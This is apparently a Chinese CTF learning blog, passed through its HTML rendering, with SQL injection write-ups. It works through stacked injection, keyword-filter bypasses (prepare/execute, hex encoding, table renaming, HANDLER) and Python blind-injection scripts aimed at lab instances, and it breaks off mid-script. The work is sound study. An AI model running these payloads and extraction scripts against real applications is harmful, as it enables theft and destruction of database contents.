<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">requests.(请求方式，get或post)<br><br>re=requests.post(url,data,可选其它功能（如timeout=$）)<br><br><span class="hljs-comment">#re.text 就等于服务器返回内容中的字符内容</span><br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> re.text:<br><br>还有data内容的表示<br>data=&#123;<span class="hljs-string">&quot;id&quot;</span>:sql&#125;<br></code></pre></td></tr></table></figure>


<blockquote>
<p>for st in (1,128):<br>当时只猜测了flag的前两个字符，问了kimi，说我这个(1,128)的意思是数组，只会进行两次循环😅<br>正确语句<br>for st in range(64,128):</p>
</blockquote>
<p>第一次脚本跑的很慢，而且很容易与服务器断连，看别人wp有用二分法的，自己整了个二分法的版本出来  </p>
<p>这时又遇到了另一个问题<br>当初用requests时学别人wp加上了timeout&#x3D;10，动不动就超时</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">re</span>=requests.post(url,<span class="hljs-class"><span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>.timeout=10)</span><br></code></pre></td></tr></table></figure>
<p>然后就去掉了timeout，但还是很容易断连<br>于是又有了</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第%d个字符&quot;</span><span class="hljs-literal">%i</span>)<br>得到：<br><br>第<span class="hljs-number">32</span>个字符<br>NSSCTF&#123;479a596c-<span class="hljs-number">2b47</span>-41ae-b4dc-<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure>
<p>要是断连的话直接改一下这个起始字符就能继续爆了</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>)<br></code></pre></td></tr></table></figure>

<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>fuzz不会，没有清晰的思路的话真的很费劲，要多学学fuzz思路</p>
<hr>
<h2 id="title-note-20date-2025-03-28-15-12-28tags-sql"><a href="#title-note-20date-2025-03-28-15-12-28tags-sql" class="headerlink" title="title: note-20date: 2025-03-28 15:12:28tags: sql"></a>title: note-20<br>date: 2025-03-28 15:12:28<br>tags: sql</h2><h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="强网杯 2019 随便注"></a>强网杯 2019 随便注</h1><p>上次做这题还是两个月前，好像也是这题坚定了我打基础的原因，虽然现在看还是得看大佬们的wp<br>但以前是wp都看不明白<br>先是数字传参，<br>注入点</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">inject</span>=1&#x27;#<br></code></pre></td></tr></table></figure>
<p>尝试</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;<span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>

<p>回显  </p>
<p>return preg_match(“&#x2F;select|update|delete|drop|insert|where|.&#x2F;i”,$inject);</p>
<p>尝试</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp"><span class="hljs-number">1</span>&#x27;or extractvalue(<span class="hljs-number">1</span>,concat(&#x27;!&#x27;,database()))  # <br></code></pre></td></tr></table></figure>
<p>成功回显<br>error 1105 : XPATH syntax error: ‘!supersqli’</p>
<p>好像能用报错，但是select被过滤了呀🤡</p>
<p>尝试了<br>双写绕过<br>使用URL编码<br>&lt;&gt;绕过<br>无果  </p>
<p>只能看wp了吗<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/545713669">https://zhuanlan.zhihu.com/p/545713669</a><br>原wp写的是真的好，详细透彻</p>
<p>使用堆叠注入，查看数据库</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show databases;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">回显：</span><br><span class="hljs-string">array(2) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(1) &quot;1&quot;</span><br><span class="hljs-string">  [1]=&gt;</span><br><span class="hljs-string">  string(7) &quot;hahahah&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(11) &quot;ctftraining&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(18) &quot;information_schema&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(5) &quot;mysql&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(18) &quot;performance_schema&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(9) &quot;supersqli&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(4) &quot;test&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
<p>然后是查看表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show tables from supersqli;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">回显：</span><br><span class="hljs-string">array(2) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(1) &quot;1&quot;</span><br><span class="hljs-string">  [1]=&gt;</span><br><span class="hljs-string">  string(7) &quot;hahahah&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(16) &quot;1919810931114514&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(5) &quot;words&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
<p>查看字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show colums from &quot;1919810931114514&quot;;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">没法回显</span><br><span class="hljs-string"></span><br><span class="hljs-string">改为</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">show</span> columns <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;1919810931114514&#x27;</span>;#<br><br>不行<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show columns from `1919810931114514`;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">成功回显:</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(2) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(1) &quot;1&quot;</span><br><span class="hljs-string">  [1]=&gt;</span><br><span class="hljs-string">  string(7) &quot;hahahah&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(6) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(4) &quot;flag&quot;</span><br><span class="hljs-string">  [1]=&gt;</span><br><span class="hljs-string">  string(12) &quot;varchar(100)&quot;</span><br><span class="hljs-string">  [2]=&gt;</span><br><span class="hljs-string">  string(2) &quot;NO&quot;</span><br><span class="hljs-string">  [3]=&gt;</span><br><span class="hljs-string">  string(0) &quot;&quot;</span><br><span class="hljs-string">  [4]=&gt;</span><br><span class="hljs-string">  NULL</span><br><span class="hljs-string">  [5]=&gt;</span><br><span class="hljs-string">  string(0) &quot;&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
<blockquote>
<p>注意，如果tableName是纯数字，需要用<code>包裹，比如1&#39;;desc </code>1919810931114514&#96;;#</p>
</blockquote>
<p>原来是 &#96; 而不是 ‘ 🤡</p>
<p>到这步骤就有多种方法解题了  </p>
<h2 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h2><p>通过预编译的方式拼接select 关键字：  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;prepare hack from concat(&#x27;</span>sele<span class="hljs-string">&#x27;,&#x27;</span>ct<span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> `<span class="hljs-number">1919810931114514</span>`<span class="hljs-string">&#x27;);execute hack;#</span><br></code></pre></td></tr></table></figure>
<p>得flag{f2078443-bdad-4914-b367-e6691fd333c5}</p>
<h2 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h2><blockquote>
<p>将select * from <code>1919810931114514</code>语句进行16进制编码<br>73656c656374202a2066726f6d20603139313938313039333131313435313460</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#</span><br><span class="hljs-string">或者定义一个变量名</span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">Set</span> <span class="hljs-variable">@jia</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="hljs-keyword">PREPARE</span> hacker <span class="hljs-keyword">from</span> <span class="hljs-variable">@jia</span>;<span class="hljs-keyword">EXECUTE</span> hacker;#<br></code></pre></td></tr></table></figure>
<p>看情况用把，我觉得能用预编译的话，那很多都能解决了</p>
<h2 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h2><blockquote>
<p>最后一步（第8步）也可以通过修改表名和列名来实现。我们输入1后，默认会显示id为1的数据，可以猜测默认显示的是words表的数据，查看words表结构第一个字段名为id我们把words表随便改成words1，然后把1919810931114514表改成words，再把列名flag改成id，就可以达到直接输出flag字段的值的效果：</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);# </span><br><span class="hljs-string">然后直接</span><br><span class="hljs-string">1&#x27;</span>; <span class="hljs-keyword">or</span> ture<br>查看所有字段拿到flag<br></code></pre></td></tr></table></figure>

<p>666，改不了查询语句就改表名，思路太开阔了，</p>
<p>这里要注意:<br>我在自己尝试的时候没有将换表名和改字段的操作一条语句完成，我是先改的words to words1，导致了源码sql查询语句的查words出错，后面将flag表改成words的操作无法传入，一切后续操作失效，这时sql语句查询的words，但是现在已经没有words这个表了，原sql语句就用不了了，永远报错，应该是相当于这个靶机废了；</p>
<h2 id="法四："><a href="#法四：" class="headerlink" title="法四："></a>法四：</h2><blockquote>
<p>此题还可以通过handle直接出答案：</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;</span><br></code></pre></td></tr></table></figure>
<h1 id="notice-2"><a href="#notice-2" class="headerlink" title="notice"></a>notice</h1><hr>
<h2 id="0x01-堆叠注入原理"><a href="#0x01-堆叠注入原理" class="headerlink" title="0x01 堆叠注入原理"></a>0x01 堆叠注入原理</h2><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid&#x3D;1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
<h2 id="0x02-预编译"><a href="#0x02-预编译" class="headerlink" title="0x02 预编译"></a>0x02 预编译</h2><blockquote>
<p>预编译相当于定一个语句相同，参数不通的Mysql模板，我们可以通过预编译的方式，绕过特定的字符过滤,  </p>
</blockquote>
<p>我理解是先写好sql语句命令，然后执行，类似编程语言里的定义函数或类？<br>预编译命令用法:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">PREPARE</span> 名称 <span class="hljs-keyword">FROM</span> 	<span class="hljs-keyword">Sql</span>语句 ? ;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@x</span><span class="hljs-operator">=</span>xx;<br><span class="hljs-keyword">EXECUTE</span> 名称 <span class="hljs-keyword">USING</span> <span class="hljs-variable">@x</span>;<br></code></pre></td></tr></table></figure>
<p>例子</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql">方法一：<br><span class="hljs-keyword">SElECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> t_user <span class="hljs-keyword">WHERE</span> USER_ID <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br><br>方法二：<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;<br><span class="hljs-keyword">EXECUTE</span> jia;<br><br>方法三：<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;SELECT * FROM t_user WHERE USER_ID = ?&#x27;</span>;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@ID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">EXECUTE</span> jia <span class="hljs-keyword">USING</span> <span class="hljs-variable">@ID</span>;<br><br>方法四：<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@SQL</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@SQL</span>;<br><span class="hljs-keyword">EXECUTE</span> jia;<br></code></pre></td></tr></table></figure>

<h2 id="0x03-更改表名"><a href="#0x03-更改表名" class="headerlink" title="0x03 更改表名"></a>0x03 更改表名</h2><p>修改表名：ALTER TABLE 旧表名 RENAME TO 新表名；<br>修改字段：ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型；</p>
<h2 id="0x04-handle"><a href="#0x04-handle" class="headerlink" title="0x04 handle"></a>0x04 handle</h2><p>MySQL 除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。handler 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 打开一个表名为 tbl_name 的表的句柄<br>HANDLER tbl_name <span class="hljs-keyword">OPEN</span> [ [<span class="hljs-keyword">AS</span>] alias]<br><br># <span class="hljs-number">1</span>、通过指定索引查看表，可以指定从索引那一行开始，通过 NEXT 继续浏览<br>HANDLER tbl_name READ index_name &#123; <span class="hljs-operator">=</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&lt;=</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&gt;=</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&lt;</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&gt;</span> &#125; (value1,value2,...)<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [LIMIT ... ]<br><br># <span class="hljs-number">2</span>、通过索引查看表<br># <span class="hljs-keyword">FIRST</span>: 获取第一行（索引最小的一行）<br># NEXT: 获取下一行<br># PREV: 获取上一行<br># <span class="hljs-keyword">LAST</span>: 获取最后一行（索引最大的一行）<br>HANDLER tbl_name READ index_name &#123; <span class="hljs-keyword">FIRST</span> <span class="hljs-operator">|</span> NEXT <span class="hljs-operator">|</span> PREV <span class="hljs-operator">|</span> <span class="hljs-keyword">LAST</span> &#125;<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [LIMIT ... ]<br><br># <span class="hljs-number">3</span>、不通过索引查看表<br># READ <span class="hljs-keyword">FIRST</span>: 获取句柄的第一行<br># READ NEXT: 依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）<br># 最后一行执行之后再执行 READ NEXT 会返回一个空的结果<br>HANDLER tbl_name READ &#123; <span class="hljs-keyword">FIRST</span> <span class="hljs-operator">|</span> NEXT &#125;<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [LIMIT ... ]<br><br># 关闭已打开的句柄<br>HANDLER tbl_name <span class="hljs-keyword">CLOSE</span><br><br></code></pre></td></tr></table></figure>
<p>参考wp里的语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;</span><br></code></pre></td></tr></table></figure>
<p>更详细用法<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43427482/article/details/109898934">https://blog.csdn.net/qq_43427482/article/details/109898934</a></p>
<hr>
<h2 id="title-note-21date-2025-04-06-01-47-37tags-sql"><a href="#title-note-21date-2025-04-06-01-47-37tags-sql" class="headerlink" title="title: note-21date: 2025-04-06 01:47:37tags: sql"></a>title: note-21<br>date: 2025-04-06 01:47:37<br>tags: sql</h2><h1 id="GYCTF2020-Ezsqli-1"><a href="#GYCTF2020-Ezsqli-1" class="headerlink" title="[GYCTF2020]Ezsqli 1"></a>[GYCTF2020]Ezsqli 1</h1><p>fuzz没fuzz懂，看别人wp是数字型注入<br>bp出or和and被过滤了，没回显，那就是盲注了<br>看别人wp是用 ^ 代替 or , &amp;&amp; 代替 and<br>测试是否有回显：</p>
<figure class="highlight m"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs m"><span class="hljs-number">1</span>&amp;&amp;length(database())&gt;<span class="hljs-number">0</span><br><span class="hljs-number">1</span>&amp;&amp;length(database())&lt;<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
<p>然后测试substr和ascii是否被过滤：</p>
<figure class="highlight m"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs m"><span class="hljs-number">1</span>&amp;&amp;ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">0</span><br><span class="hljs-number">1</span>&amp;&amp;ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
<p>写脚本求数据库长度和名字：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&#x27;_-&#125;&#123;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br>url = <span class="hljs-string">&#x27;http://c2a220ad-23f1-4a7a-82c0-73eeafd4d980.node5.buuoj.cn:81/index.php&#x27;</span><br><span class="hljs-comment"># 1&amp;&amp;ascii(substr(database(),1,1))=</span><br>database_name=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    payload = <span class="hljs-string">&#x27;1&amp;&amp;length(database())=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(l)<br>    data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>    re = requests.post(url,data)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;testing 数据库长度:&quot;</span>,l)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库长度:&quot;</span>,l)<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,l+<span class="hljs-number">1</span>) :<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        payload = <span class="hljs-string">&quot;1&amp;&amp;substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;</span>.<span class="hljs-built_in">format</span>(i,s)<br>        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>        re = requests.post(url,data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            database_name=database_name + s<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第&quot;</span>,i,<span class="hljs-string">&quot;个字符： &quot;</span>,database_name)<br>            <span class="hljs-keyword">break</span> <br></code></pre></td></tr></table></figure>
<blockquote>
<p>获取到数据库信息之后开始获取数据库内的表名，在测试的时候发现information_schema被过滤了，那就尝试下mysql.innodb_table_stats(mysql默认关闭InnoDB存储引擎)一样不行，那就只能百度了，看网上采用的是sys.x$schema_flattened_keys（需要版本&gt;5.7且只能查询表明，使用方法与information_schema类似）  </p>
</blockquote>
<p>我这个环境只有sys.x$schema_flattened_keys能用，有的wp用sys.schema_table_statistics_with_buffer，我这没测出来<br>求表名(写这步卡了我一个小时):</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&#x27;,-./0123456789:;&lt;&gt;=?@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`&#123;|&#125;~#&#x27;</span><br>url = <span class="hljs-string">&#x27;http://72f05b95-5f5b-4315-94d1-fb6b35544ce8.node5.buuoj.cn:81/index.php&#x27;</span><br><span class="hljs-comment"># 1&amp;&amp;ascii(substr(database(),1,1))=</span><br>database_name=<span class="hljs-string">&#x27;&#x27;</span><br>name=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># for l in range (1,100):</span><br><span class="hljs-comment">#     payload = &#x27;1&amp;&amp;length(database())=&#123;&#125;&#x27;.format(l)</span><br><span class="hljs-comment">#     data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#     re = requests.post(url,data)</span><br><span class="hljs-comment">#     print(&quot;testing 数据库长度:&quot;,l)</span><br><span class="hljs-comment">#     if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#         print(&quot;数据库长度:&quot;,l)</span><br><span 